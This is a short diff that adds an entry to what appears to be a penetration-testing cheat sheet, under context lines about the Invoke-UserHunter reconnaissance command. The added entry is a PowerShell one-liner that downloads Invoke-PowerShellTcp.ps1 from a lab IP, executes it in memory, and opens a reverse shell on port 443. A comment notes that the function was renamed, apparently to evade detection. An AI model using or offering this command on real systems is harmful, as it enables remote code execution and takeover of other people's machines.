@@ -51,4 +51,8 @@ Invoke-UserHunter
 
 Invoke-UserHunter -Checkaccess
 
+Reverse shell using Invoke-PowerShellTCP:
+
+powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443 #function name changed to power
+
 
